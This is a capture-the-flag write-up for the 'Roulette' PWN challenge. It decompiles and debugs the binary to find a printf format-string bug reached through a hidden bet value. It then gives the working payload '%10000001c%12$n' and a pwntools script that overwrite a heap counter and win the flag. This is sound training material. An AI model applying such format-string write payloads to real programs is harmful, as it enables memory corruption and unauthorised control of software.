# Roulette - Matrix Cyber Labs CTF 2021
PWN, 150 Points

## Description

*nc challenges.ctfd.io 30426*

And attached file [roulette.bin](roulette.bin)

## Roulette Solution

Let's try to run the binary: 

```console
┌─[evyatar@parrot]─[/media/shared/ctf/matrix/Roulette]
└──╼ $./roulette.bin 
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
2
num is : 6
The house always wins... Bye!
```

Roullete game, Let's try to look on the code using Ghidra:

```c
undefined8 main(void)

{
  int iVar1;
  ssize_t sVar2;
  uint local_4c;
  ulong local_48;
  int local_3c;
  long local_38;
  uint local_30;
  undefined4 local_2c;
  uint *local_28;
  undefined8 local_20;
  char *local_18;
  int local_c;
  
  local_18 = (char *)0x0;
  local_20 = 0;
  local_28 = (uint *)0x0;
  local_2c = 0;
  local_48 = 2;
  local_4c = 0;
  local_30 = 0;
  local_38 = 0;
  local_28 = (uint *)malloc(4);
  *local_28 = 1;
  local_38 = time((time_t *)0x0);
  srand((uint)local_38);
  iVar1 = genrate_random_number(1000,10000);
  local_38 = local_38 + iVar1;
  srand((uint)local_38);
  fflush(stdout);
  puts("Welcome to Casino Royal");
  fflush(stdout);
  printf("This is a roulette game\nYou have %d point to start with.\n",(ulong)*local_28);
  fflush(stdout);
  puts("How many games would you like to play(Up to 2)?");
  fflush(stdout);
  iVar1 = __isoc99_scanf(&DAT_00102090,&local_48);
  if (iVar1 == 1) {
    fflush(stdin);
    if ((local_48 < 3) || (local_48 == 0xffffffffffffffff)) {
      local_c = 0;
      while ((ulong)(long)local_c < local_48) {
        puts("Choose your bet (1-36)");
        fflush(stdout);
        iVar1 = __isoc99_scanf(&DAT_001020f1,&local_4c);
        if (iVar1 != 1) {
          printf("Something went wrong!");
          fflush(stdout);
        }
        fflush(stdin);
        if (((int)local_4c < 1) || (0x24 < (int)local_4c)) {
          if (local_4c == 0x31519) {
            puts(
                "Please enter your command (it will be printed to make sure you entered the rightone):"
                );
            fflush(stdout);
            local_18 = (char *)malloc(0x40);
            sVar2 = read(0,local_18,0x40);
            local_3c = (int)sVar2;
            fflush(stdout);
            if (local_3c == -1) {
              puts("something went wrong with your command");
              fflush(stdout);
            }
            printf(local_18);
            fflush(stdout);
            free(local_18);
            goto LAB_00101588;
          }
          puts("Bet is out of range... choose another");
          fflush(stdout);
        }
        else {
          local_30 = genrate_random_number(1,0x24);
          printf("num is : %d\n",(ulong)local_30);
          fflush(stdout);
          if (local_30 != local_4c) {
            puts("The house always wins... Bye!");
            fflush(stdout);
            free(local_28);
            return 0;
          }
          *local_28 = *local_28 * 0x24;
          printf("You won this round\nPoints: %d\n",(ulong)*local_28);
          fflush(stdout);
LAB_00101588:
          if (10000000 < (int)*local_28) {
            free(local_28);
            puts("You Won!\n The Flag is: MCL{NOT_A_REAL_FLAG}");
            fflush(stdout);
            return 0;
          }
        }
        local_c = local_c + 1;
      }
    }
    else {
      puts("You\'re trying to trick me! I\'m leaving...");
      fflush(stdout);
    }
  }
  else {
    puts("Something went wrong!");
    fflush(stdout);
  }
  return 0;
}
```

We can see that we have a value on the heap named ```uint *local_28``` which being initiallized to one after malloc:
```c
local_28 = (uint *)malloc(4);
*local_28 = 1;
```

Then some prints, And then we can see if our input equal to 1 we get into the following if statement:
```c
...
puts("Welcome to Casino Royal");
fflush(stdout);
printf("This is a roulette game\nYou have %d point to start with.\n",(ulong)*local_28);
fflush(stdout);
puts("How many games would you like to play(Up to 2)?");
fflush(stdout);
iVar1 = __isoc99_scanf(&DAT_00102090,&local_48);
if (iVar1 == 1) { //<------
	...
}
```

Once we choose our game play number we need to choose our bet:
```c
if (iVar1 == 1) {
    fflush(stdin);
    if ((local_48 < 3) || (local_48 == 0xffffffffffffffff)) {
      local_c = 0;
      while ((ulong)(long)local_c < local_48) {
        puts("Choose your bet (1-36)"); //<------
        fflush(stdout);
        iVar1 = __isoc99_scanf(&DAT_001020f1,&local_4c); //<------
        if (iVar1 != 1) {
          printf("Something went wrong!");
          fflush(stdout);
        }
        fflush(stdin);
        if (((int)local_4c < 1) || (0x24 < (int)local_4c)) {
          if (local_4c == 0x31519) { //<------
            puts(
                "Please enter your command (it will be printed to make sure you entered the rightone):"
                );
```

We can see that if we choose to play one game and our bet is 0x31519 (202009) we get into option to enter command, Let's try it:

```console
┌─[evyatar@parrot]─[/media/shared/ctf/matrix/Roulette]
└──╼ $./roulette.bin 
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
202009
Please enter your command (it will be printed to make sure you entered the right one):
ls
ls
```

According the rest of the code we can see that our bet printed by ```printf```:
```c
if (local_4c == 0x31519) {
            puts(
                "Please enter your command (it will be printed to make sure you entered the rightone):"
                );
            fflush(stdout);
            local_18 = (char *)malloc(0x40);
            sVar2 = read(0,local_18,0x40);
            local_3c = (int)sVar2;
            fflush(stdout);
            if (local_3c == -1) {
              puts("something went wrong with your command");
              fflush(stdout);
            }
            printf(local_18); //<------
            fflush(stdout);
            free(local_18);
            goto LAB_00101588; //<------
          }
```

If our input printed by ```printf``` we can use [(Format String attack)](https://owasp.org/www-community/attacks/Format_string_attack) to change values in the stack.

After ```printf``` function executed we can see that the code will jump to ```LAB_00101588```
```c
LAB_00101588:
          if (10000000 < (int)*local_28) {
            free(local_28);
            puts("You Won!\n The Flag is: MCL{NOT_A_REAL_FLAG}");
            fflush(stdout);
            return 0;
          }
```
So It's mean that if we can change ```local_28``` by Format string vuln to 10000001 we can print the flag.

Let's run the binary using ```gdb``` to see the stack and to put a breakpoint on the line of ```if (local_4c == 0x31519)``` and look at the stack when we break at this line ```if (10000000 < (int)*local_28)```

```asm
┌─[evyatar@parrot]─[/media/shared/ctf/matrix/Roulette]
└──╼ $gdb roulette.bin 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from roulette.bin...(no debugging symbols found)...done.
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x00000000000011f1 <+0>:	push   rbp
   0x00000000000011f2 <+1>:	mov    rbp,rsp
   0x00000000000011f5 <+4>:	sub    rsp,0x50
   0x00000000000011f9 <+8>:	mov    QWORD PTR [rbp-0x10],0x0
   0x0000000000001201 <+16>:	mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000001209 <+24>:	mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000001211 <+32>:	mov    DWORD PTR [rbp-0x24],0x0
   0x0000000000001218 <+39>:	mov    QWORD PTR [rbp-0x40],0x2
   0x0000000000001220 <+47>:	mov    DWORD PTR [rbp-0x44],0x0
   0x0000000000001227 <+54>:	mov    DWORD PTR [rbp-0x28],0x0
   0x000000000000122e <+61>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000001236 <+69>:	mov    edi,0x4
   0x000000000000123b <+74>:	call   0x1090 <malloc@plt>
   0x0000000000001240 <+79>:	mov    QWORD PTR [rbp-0x20],rax
   0x0000000000001244 <+83>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000001248 <+87>:	mov    DWORD PTR [rax],0x1
   0x000000000000124e <+93>:	mov    edi,0x0
   0x0000000000001253 <+98>:	call   0x1080 <time@plt>
   0x0000000000001258 <+103>:	mov    QWORD PTR [rbp-0x30],rax
   0x000000000000125c <+107>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000001260 <+111>:	mov    edi,eax
   0x0000000000001262 <+113>:	call   0x1070 <srand@plt>
   0x0000000000001267 <+118>:	mov    esi,0x2710
   0x000000000000126c <+123>:	mov    edi,0x3e8
   0x0000000000001271 <+128>:	call   0x11c5 <genrate_random_number>
   0x0000000000001276 <+133>:	cdqe   
   0x0000000000001278 <+135>:	add    QWORD PTR [rbp-0x30],rax
   0x000000000000127c <+139>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000001280 <+143>:	mov    edi,eax
   0x0000000000001282 <+145>:	call   0x1070 <srand@plt>
   0x0000000000001287 <+150>:	mov    rax,QWORD PTR [rip+0x2df2]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x000000000000128e <+157>:	mov    rdi,rax
   0x0000000000001291 <+160>:	call   0x10a0 <fflush@plt>
   0x0000000000001296 <+165>:	lea    rdi,[rip+0xd6b]        # 0x2008
   0x000000000000129d <+172>:	call   0x1040 <puts@plt>
   0x00000000000012a2 <+177>:	mov    rax,QWORD PTR [rip+0x2dd7]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x00000000000012a9 <+184>:	mov    rdi,rax
   0x00000000000012ac <+187>:	call   0x10a0 <fflush@plt>
   0x00000000000012b1 <+192>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000000012b5 <+196>:	mov    eax,DWORD PTR [rax]
   0x00000000000012b7 <+198>:	mov    esi,eax
   0x00000000000012b9 <+200>:	lea    rdi,[rip+0xd60]        # 0x2020
   0x00000000000012c0 <+207>:	mov    eax,0x0
   0x00000000000012c5 <+212>:	call   0x1050 <printf@plt>
   0x00000000000012ca <+217>:	mov    rax,QWORD PTR [rip+0x2daf]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x00000000000012d1 <+224>:	mov    rdi,rax
   0x00000000000012d4 <+227>:	call   0x10a0 <fflush@plt>
   0x00000000000012d9 <+232>:	lea    rdi,[rip+0xd80]        # 0x2060
   0x00000000000012e0 <+239>:	call   0x1040 <puts@plt>
   0x00000000000012e5 <+244>:	mov    rax,QWORD PTR [rip+0x2d94]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x00000000000012ec <+251>:	mov    rdi,rax
   0x00000000000012ef <+254>:	call   0x10a0 <fflush@plt>
   0x00000000000012f4 <+259>:	lea    rax,[rbp-0x40]
   0x00000000000012f8 <+263>:	mov    rsi,rax
   0x00000000000012fb <+266>:	lea    rdi,[rip+0xd8e]        # 0x2090
   0x0000000000001302 <+273>:	mov    eax,0x0
   0x0000000000001307 <+278>:	call   0x10b0 <__isoc99_scanf@plt>
   0x000000000000130c <+283>:	cmp    eax,0x1
   0x000000000000130f <+286>:	je     0x1336 <main+325>
   0x0000000000001311 <+288>:	lea    rdi,[rip+0xd7c]        # 0x2094
   0x0000000000001318 <+295>:	call   0x1040 <puts@plt>
   0x000000000000131d <+300>:	mov    rax,QWORD PTR [rip+0x2d5c]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x0000000000001324 <+307>:	mov    rdi,rax
   0x0000000000001327 <+310>:	call   0x10a0 <fflush@plt>
   0x000000000000132c <+315>:	mov    eax,0x0
   0x0000000000001331 <+320>:	jmp    0x15df <main+1006>
   0x0000000000001336 <+325>:	mov    rax,QWORD PTR [rip+0x2d53]        # 0x4090 <stdin@@GLIBC_2.2.5>
   0x000000000000133d <+332>:	mov    rdi,rax
   0x0000000000001340 <+335>:	call   0x10a0 <fflush@plt>
   0x0000000000001345 <+340>:	mov    rax,QWORD PTR [rbp-0x40]
   0x0000000000001349 <+344>:	cmp    rax,0x2
   0x000000000000134d <+348>:	jbe    0x137e <main+397>
   0x000000000000134f <+350>:	mov    rax,QWORD PTR [rbp-0x40]
   0x0000000000001353 <+354>:	cmp    rax,0xffffffffffffffff
   0x0000000000001357 <+358>:	je     0x137e <main+397>
   0x0000000000001359 <+360>:	lea    rdi,[rip+0xd50]        # 0x20b0
   0x0000000000001360 <+367>:	call   0x1040 <puts@plt>
   0x0000000000001365 <+372>:	mov    rax,QWORD PTR [rip+0x2d14]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x000000000000136c <+379>:	mov    rdi,rax
   0x000000000000136f <+382>:	call   0x10a0 <fflush@plt>
   0x0000000000001374 <+387>:	mov    eax,0x0
   0x0000000000001379 <+392>:	jmp    0x15df <main+1006>
   0x000000000000137e <+397>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001385 <+404>:	jmp    0x15c7 <main+982>
   0x000000000000138a <+409>:	lea    rdi,[rip+0xd49]        # 0x20da
   0x0000000000001391 <+416>:	call   0x1040 <puts@plt>
   0x0000000000001396 <+421>:	mov    rax,QWORD PTR [rip+0x2ce3]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x000000000000139d <+428>:	mov    rdi,rax
   0x00000000000013a0 <+431>:	call   0x10a0 <fflush@plt>
   0x00000000000013a5 <+436>:	lea    rax,[rbp-0x44]
   0x00000000000013a9 <+440>:	mov    rsi,rax
   0x00000000000013ac <+443>:	lea    rdi,[rip+0xd3e]        # 0x20f1
   0x00000000000013b3 <+450>:	mov    eax,0x0
   0x00000000000013b8 <+455>:	call   0x10b0 <__isoc99_scanf@plt>
   0x00000000000013bd <+460>:	cmp    eax,0x1
   0x00000000000013c0 <+463>:	je     0x13e2 <main+497>
   0x00000000000013c2 <+465>:	lea    rdi,[rip+0xccb]        # 0x2094
   0x00000000000013c9 <+472>:	mov    eax,0x0
   0x00000000000013ce <+477>:	call   0x1050 <printf@plt>
   0x00000000000013d3 <+482>:	mov    rax,QWORD PTR [rip+0x2ca6]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x00000000000013da <+489>:	mov    rdi,rax
   0x00000000000013dd <+492>:	call   0x10a0 <fflush@plt>
   0x00000000000013e2 <+497>:	mov    rax,QWORD PTR [rip+0x2ca7]        # 0x4090 <stdin@@GLIBC_2.2.5>
   0x00000000000013e9 <+504>:	mov    rdi,rax
   0x00000000000013ec <+507>:	call   0x10a0 <fflush@plt>
   0x00000000000013f1 <+512>:	mov    eax,DWORD PTR [rbp-0x44]
   0x00000000000013f4 <+515>:	test   eax,eax
   0x00000000000013f6 <+517>:	jle    0x14bd <main+716>
   0x00000000000013fc <+523>:	mov    eax,DWORD PTR [rbp-0x44]
   0x00000000000013ff <+526>:	cmp    eax,0x24
   0x0000000000001402 <+529>:	jg     0x14bd <main+716>
   0x0000000000001408 <+535>:	mov    esi,0x24
   0x000000000000140d <+540>:	mov    edi,0x1
   0x0000000000001412 <+545>:	call   0x11c5 <genrate_random_number>
   0x0000000000001417 <+550>:	mov    DWORD PTR [rbp-0x28],eax
   0x000000000000141a <+553>:	mov    eax,DWORD PTR [rbp-0x28]
   0x000000000000141d <+556>:	mov    esi,eax
   0x000000000000141f <+558>:	lea    rdi,[rip+0xcce]        # 0x20f4
   0x0000000000001426 <+565>:	mov    eax,0x0
   0x000000000000142b <+570>:	call   0x1050 <printf@plt>
   0x0000000000001430 <+575>:	mov    rax,QWORD PTR [rip+0x2c49]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x0000000000001437 <+582>:	mov    rdi,rax
   0x000000000000143a <+585>:	call   0x10a0 <fflush@plt>
   0x000000000000143f <+590>:	mov    eax,DWORD PTR [rbp-0x44]
   0x0000000000001442 <+593>:	cmp    DWORD PTR [rbp-0x28],eax
   0x0000000000001445 <+596>:	jne    0x148c <main+667>
   0x0000000000001447 <+598>:	mov    rax,QWORD PTR [rbp-0x20]
   0x000000000000144b <+602>:	mov    edx,DWORD PTR [rax]
   0x000000000000144d <+604>:	mov    eax,edx
   0x000000000000144f <+606>:	shl    eax,0x3
   0x0000000000001452 <+609>:	add    eax,edx
   0x0000000000001454 <+611>:	shl    eax,0x2
   0x0000000000001457 <+614>:	mov    edx,eax
   0x0000000000001459 <+616>:	mov    rax,QWORD PTR [rbp-0x20]
   0x000000000000145d <+620>:	mov    DWORD PTR [rax],edx
   0x000000000000145f <+622>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000001463 <+626>:	mov    eax,DWORD PTR [rax]
   0x0000000000001465 <+628>:	mov    esi,eax
   0x0000000000001467 <+630>:	lea    rdi,[rip+0xc9a]        # 0x2108
   0x000000000000146e <+637>:	mov    eax,0x0
   0x0000000000001473 <+642>:	call   0x1050 <printf@plt>
   0x0000000000001478 <+647>:	mov    rax,QWORD PTR [rip+0x2c01]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x000000000000147f <+654>:	mov    rdi,rax
   0x0000000000001482 <+657>:	call   0x10a0 <fflush@plt>
   0x0000000000001487 <+662>:	jmp    0x1588 <main+919>
   0x000000000000148c <+667>:	lea    rdi,[rip+0xc94]        # 0x2127
   0x0000000000001493 <+674>:	call   0x1040 <puts@plt>
   0x0000000000001498 <+679>:	mov    rax,QWORD PTR [rip+0x2be1]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x000000000000149f <+686>:	mov    rdi,rax
   0x00000000000014a2 <+689>:	call   0x10a0 <fflush@plt>
   0x00000000000014a7 <+694>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000000014ab <+698>:	mov    rdi,rax
   0x00000000000014ae <+701>:	call   0x1030 <free@plt>
   0x00000000000014b3 <+706>:	mov    eax,0x0
   0x00000000000014b8 <+711>:	jmp    0x15df <main+1006>
   0x00000000000014bd <+716>:	mov    eax,DWORD PTR [rbp-0x44]
   0x00000000000014c0 <+719>:	cmp    eax,0x31519
   0x00000000000014c5 <+724>:	jne    0x156b <main+890>
   0x00000000000014cb <+730>:	lea    rdi,[rip+0xc76]        # 0x2148
   0x00000000000014d2 <+737>:	call   0x1040 <puts@plt>
   0x00000000000014d7 <+742>:	mov    rax,QWORD PTR [rip+0x2ba2]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x00000000000014de <+749>:	mov    rdi,rax
   0x00000000000014e1 <+752>:	call   0x10a0 <fflush@plt>
   0x00000000000014e6 <+757>:	mov    edi,0x40
   0x00000000000014eb <+762>:	call   0x1090 <malloc@plt>
   0x00000000000014f0 <+767>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000000014f4 <+771>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000014f8 <+775>:	mov    edx,0x40
   0x00000000000014fd <+780>:	mov    rsi,rax
   0x0000000000001500 <+783>:	mov    edi,0x0
   0x0000000000001505 <+788>:	call   0x1060 <read@plt>
   0x000000000000150a <+793>:	mov    DWORD PTR [rbp-0x34],eax
   0x000000000000150d <+796>:	mov    rax,QWORD PTR [rip+0x2b6c]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x0000000000001514 <+803>:	mov    rdi,rax
   0x0000000000001517 <+806>:	call   0x10a0 <fflush@plt>
   0x000000000000151c <+811>:	cmp    DWORD PTR [rbp-0x34],0xffffffff
   0x0000000000001520 <+815>:	jne    0x153d <main+844>
   0x0000000000001522 <+817>:	lea    rdi,[rip+0xc77]        # 0x21a0
   0x0000000000001529 <+824>:	call   0x1040 <puts@plt>
   0x000000000000152e <+829>:	mov    rax,QWORD PTR [rip+0x2b4b]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x0000000000001535 <+836>:	mov    rdi,rax
   0x0000000000001538 <+839>:	call   0x10a0 <fflush@plt>
   0x000000000000153d <+844>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000001541 <+848>:	mov    rdi,rax
   0x0000000000001544 <+851>:	mov    eax,0x0
   0x0000000000001549 <+856>:	call   0x1050 <printf@plt>
   0x000000000000154e <+861>:	mov    rax,QWORD PTR [rip+0x2b2b]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x0000000000001555 <+868>:	mov    rdi,rax
   0x0000000000001558 <+871>:	call   0x10a0 <fflush@plt>
   0x000000000000155d <+876>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000001561 <+880>:	mov    rdi,rax
   0x0000000000001564 <+883>:	call   0x1030 <free@plt>
   0x0000000000001569 <+888>:	jmp    0x1588 <main+919>
   0x000000000000156b <+890>:	lea    rdi,[rip+0xc56]        # 0x21c8
   0x0000000000001572 <+897>:	call   0x1040 <puts@plt>
   0x0000000000001577 <+902>:	mov    rax,QWORD PTR [rip+0x2b02]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x000000000000157e <+909>:	mov    rdi,rax
   0x0000000000001581 <+912>:	call   0x10a0 <fflush@plt>
   0x0000000000001586 <+917>:	jmp    0x15c3 <main+978>
   0x0000000000001588 <+919>:	mov    rax,QWORD PTR [rbp-0x20]
   0x000000000000158c <+923>:	mov    eax,DWORD PTR [rax]
   0x000000000000158e <+925>:	cmp    eax,0x989680  # <---------
   0x0000000000001593 <+930>:	jle    0x15c3 <main+978>
   0x0000000000001595 <+932>:	mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000001599 <+936>:	mov    rdi,rax
   0x000000000000159c <+939>:	call   0x1030 <free@plt>
   0x00000000000015a1 <+944>:	lea    rdi,[rip+0xc48]        # 0x21f0
   0x00000000000015a8 <+951>:	call   0x1040 <puts@plt>
   0x00000000000015ad <+956>:	mov    rax,QWORD PTR [rip+0x2acc]        # 0x4080 <stdout@@GLIBC_2.2.5>
   0x00000000000015b4 <+963>:	mov    rdi,rax
   0x00000000000015b7 <+966>:	call   0x10a0 <fflush@plt>
   0x00000000000015bc <+971>:	mov    eax,0x0
   0x00000000000015c1 <+976>:	jmp    0x15df <main+1006>
   0x00000000000015c3 <+978>:	add    DWORD PTR [rbp-0x4],0x1
   0x00000000000015c7 <+982>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000000015ca <+985>:	movsxd rdx,eax
   0x00000000000015cd <+988>:	mov    rax,QWORD PTR [rbp-0x40]
   0x00000000000015d1 <+992>:	cmp    rdx,rax
   0x00000000000015d4 <+995>:	jb     0x138a <main+409>
   0x00000000000015da <+1001>:	mov    eax,0x0
   0x00000000000015df <+1006>:	leave  
   0x00000000000015e0 <+1007>:	ret    
End of assembler dump.
gdb-peda$ 

```

So now we can see the compare occured at this line:
```asm
   0x000000000000158e <+925>:	cmp    eax,0x989680
```
So Let's break at this line and run the code and insert as input 1 (games count), 202009 (bet) to get command insert:
```asm
gdb-peda$ b *main+925
Breakpoint 1 at 0x158e
gdb-peda$ r
Starting program: /media/shared/ctf/matrix/Rouletteroulette.bin 
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
202009
Please enter your command (it will be printed to make sure you entered the right one):
ls
ls

[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x1 
RDX: 0x555555559010 --> 0x1000000 
RSI: 0x555555559028 --> 0x0 
RDI: 0x0 
RBP: 0x7fffffffdf30 --> 0x5555555555f0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdee0 --> 0x7fffffffdf48 --> 0x7fffffffe018 --> 0x7fffffffe34e ("/media/shared/ctf/matrix/Rouletteroulette.bin")
RIP: 0x55555555558e (<main+925>:	cmp    eax,0x989680)
R8 : 0x7ffff7dcf8c0 --> 0x0 
R9 : 0x7ffff7fe04c0 (0x00007ffff7fe04c0)
R10: 0x3 
R11: 0x7ffff7a79a30 (<__GI___libc_free>:	push   r15)
R12: 0x5555555550e0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe010 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555555586 <main+917>:	jmp    0x5555555555c3 <main+978>
   0x555555555588 <main+919>:	mov    rax,QWORD PTR [rbp-0x20]
   0x55555555558c <main+923>:	mov    eax,DWORD PTR [rax]
=> 0x55555555558e <main+925>:	cmp    eax,0x989680
   0x555555555593 <main+930>:	jle    0x5555555555c3 <main+978>
   0x555555555595 <main+932>:	mov    rax,QWORD PTR [rbp-0x20]
   0x555555555599 <main+936>:	mov    rdi,rax
   0x55555555559c <main+939>:	call   0x555555555030 <free@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee0 --> 0x7fffffffdf48 --> 0x7fffffffe018 --> 0x7fffffffe34e ("/media/shared/ctf/matrix/Rouletteroulette.bin")
0008| 0x7fffffffdee8 --> 0x3151900f0b5ff 
0016| 0x7fffffffdef0 --> 0x1 
0024| 0x7fffffffdef8 --> 0x355555635 
0032| 0x7fffffffdf00 --> 0x60455753 ('SWE`')
0040| 0x7fffffffdf08 --> 0x0 
0048| 0x7fffffffdf10 --> 0x555555559260 --> 0x1  # <---------
0056| 0x7fffffffdf18 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000055555555558e in main ()
gdb-peda$ 

```

We can see that:
```asm
0048| 0x7fffffffdf10 --> 0x555555559260 --> 0x1
```
pointing to the value that contains 0x1 (which is local_28 that we need to change), 0048 => locate at place 12nd on stack.

Lets try format string vuln ```%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p``` to validate it:
```asm
gdb-peda$ r
Starting program: /home/evyatar/Desktop/matrix/roulette.bin 
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
202009
Please enter your command (it will be printed to make sure you entered the right one):
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
0x7ffff7dcf8c0.(nil).0xb40.0x7ffff7dcf8c0.0x7ffff7fe04c0.0x7fffffffdf48.0x3151900f0b5ff.0x1.0x2a55555635.0x6045683d.(nil).0x555555559260.(nil).0x555555559aa0

```

yey! :) the 12nd place contains ```0x555555559260```, Now we need to change this value by injecting different value to the stack as described here ([(reference)](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)).

Now I am just trying to use this payload:
```%10000001c%12$n``` which write 10000001 to the 12nd place on the stack against the server using ```nc```.

```console
┌─[evyatar@parrot]─[/media/shared/ctf/matrix/Roulette]
└──╼ $ nc challenges.ctfd.io 30426
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1
Choose your bet (1-36)
202009
Please enter your command (it will be printed to make sure you entered the right one):
%10000001c%12$n

                                             <A LOT OF SPACES......>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
You Won!
 The Flag is: MCL{I_HOPE_YOU'LL_BE_HAPPY_NOW}
```

We can get it also by using ```pwntools```:
```python
from pwn import *

payload="%10000001c%12$n"
game_count="1\n"
bet="202009\n"

p = remote('challenges.ctfd.io' , 30426)

print(p.recvuntil('?').decode('utf-8'))
p.send(game_count)
print(game_count)


print(p.recvuntil(')').decode('utf-8'))
p.send(bet)
print(bet)

print(p.recvuntil(':').decode('utf-8'))
p.send(payload)
print(payload)

print("Wait a few seconds to get the flag...")
print(p.recvuntil('}').decode('utf-8').strip())

```


Run it:
```console
┌─[evyatar@parrot]─[/media/shared/ctf/matrix/Roulette]
└──╼ $python3 roulette.py 
[+] Opening connection to challenges.ctfd.io on port 30426: Done
Welcome to Casino Royal
This is a roulette game
You have 1 point to start with.
How many games would you like to play(Up to 2)?
1

Choose your bet (1-36)
202009

Please enter your command (it will be printed to make sure you entered the right one):
%10000001c%12$n
Wait a few seconds to get the flag...
\x00ou Won!
 The Flag is: MCL{I_HOPE_YOU'LL_BE_HAPPY_NOW}
```
